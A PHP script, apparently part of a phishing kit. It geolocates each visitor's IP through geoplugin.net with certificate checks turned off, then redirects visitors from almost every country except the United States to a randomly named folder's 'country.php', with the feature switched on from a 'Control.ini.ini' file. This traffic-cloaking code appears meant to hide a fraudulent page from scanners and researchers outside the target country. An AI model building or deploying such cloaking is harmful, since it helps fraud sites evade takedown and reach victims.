<?php
$tanitatikaram = parse_ini_file("Control.ini.ini", true);
$setting_country = $tanitatikaram['country'];
if ($setting_country == 'on') {
    $ip = getenv("REMOTE_ADDR");
    $url = "http://www.geoplugin.net/json.gp?ip=" . $ip;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $resp = curl_exec($ch);
    curl_close($ch);
    $details = json_decode($resp, true);
    $countrycode = $details['geoplugin_countryCode'];
if ($countrycode == "NL") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "A1") {
   header('Location: roUCzQy13txUstN1/country.php');
} 
else if ($countrycode == "AD") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AE") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AF") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AG") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AI") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AL") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AN") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AO") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AP") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AQ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AR") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AS") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AT") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AU") {
   header('Location: roUCzQy13txUstN1/country.php');
} else if ($countrycode == "AW") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AX") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "AZ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BA") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BB") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BD") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BE") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BD") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BE") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BF") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BG") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BH") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BI") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BJ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BM") {
   header('Location: roUCzQy13txUstN1/country.php');
} 
else if ($countrycode == "BN") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BO") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BR") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BS") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BT") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BV") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BV") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BW") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BY") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "BZ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CA") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CC") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CD") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CF") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CG") {
   header('Location: roUCzQy13txUstN1/country.php');
} else if ($countrycode == "CH") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CI") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CK") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CL") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CN") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CO") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CR") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CU") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CV") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CX") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CY") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "CZ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "DE") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "DJ") {
   header('Location: roUCzQy13txUstN1/country.php');
} else if ($countrycode == "DK") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "DM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "DO") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "DZ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "EC") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "EE") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "EG") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "EH") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "ER") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "ES") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "ET") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "EU") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "FI") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "FJ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "FK") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "FM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "FO") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "FR") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GA") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GB") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GD") {
   header('Location: roUCzQy13txUstN1/country.php');
} else if ($countrycode == "GE") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GF") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GG") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GH") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GI") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GL") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GN") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GP") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GQ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GR") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GS") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GT") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GU") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "GW") {
   header('Location: roUCzQy13txUstN1/country.php');
} 
else if ($countrycode == "GY") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "HK") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "HM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "HN") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "HR") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "HT") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "HU") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "ID") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "IE") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "IL") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "IM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "IN") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "IO") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "IQ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "IR") {
   header('Location: roUCzQy13txUstN1/country.php');
} else if ($countrycode == "IS") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "IT") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "JE") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "JM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "JO") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "JP") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "KE") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "KG") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "KH") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "KI") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "KM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "KN") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "KP") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "KR") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "KW") {
   header('Location: roUCzQy13txUstN1/country.php');
} 
else if ($countrycode == "KY") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "KZ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "LA") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "LB") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "LC") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "LI") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "LK") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "LR") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "LS") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "LT") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "LU") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "LV") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "LY") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MA") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MC") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MD") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "ME") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MG") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MH") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MK") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "ML") {
   header('Location: roUCzQy13txUstN1/country.php');
} else if ($countrycode == "MM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MN") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MO") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MP") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MQ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MR") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MQ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MR") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MS") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MT") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MU") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MV") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MW") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "MX") {
   header('Location: roUCzQy13txUstN1/country.php');
}else if ($countrycode == "MY") {
   header('Location: roUCzQy13txUstN1/country.php');
} else if ($countrycode == "MZ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "NA") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "NC") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "NE") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "NF") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "NG") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "NI") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "NO") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "NP") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "NR") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "NU") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "NZ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "OM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "PA") {
   header('Location: roUCzQy13txUstN1/country.php');
} 
else if ($countrycode == "PE") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "PF") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "PG") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "PH") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "PK") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "PL") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "PM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "PN") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "PR") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "PS") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "PT") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "PW") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "PY") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "QA") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "RE") {
   header('Location: roUCzQy13txUstN1/country.php');
} else if ($countrycode == "RO") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "RS") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "RU") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "RW") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SA") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SB") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SC") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SD") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SE") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SG") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SH") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SI") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SJ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SK") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SL") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SN") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SO") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SR") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "ST") {
   header('Location: roUCzQy13txUstN1/country.php');
} else if ($countrycode == "SV") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SY") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "SZ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "TC") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "TD") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "TF") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "TG") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "TH") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "TJ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "TK") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "TL") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "TM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "TN") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "TO") {
   header('Location: roUCzQy13txUstN1/country.php');
}else if ($countrycode == "TR") {
   header('Location: roUCzQy13txUstN1/country.php');
} else if ($countrycode == "TT") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "TV") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "TW") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "TZ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "UA") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "UG") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "UM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "UY") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "UZ") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "VA") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "VC") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "VE") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "VG") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "VI") {
   header('Location: roUCzQy13txUstN1/country.php');
} else if ($countrycode == "VN") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "VU") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "WF") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "WS") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "YE") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "YT") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "ZA") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "ZM") {
   header('Location: roUCzQy13txUstN1/country.php');
}
else if ($countrycode == "ZW") {
   header('Location: roUCzQy13txUstN1/country.php');
}
};
?>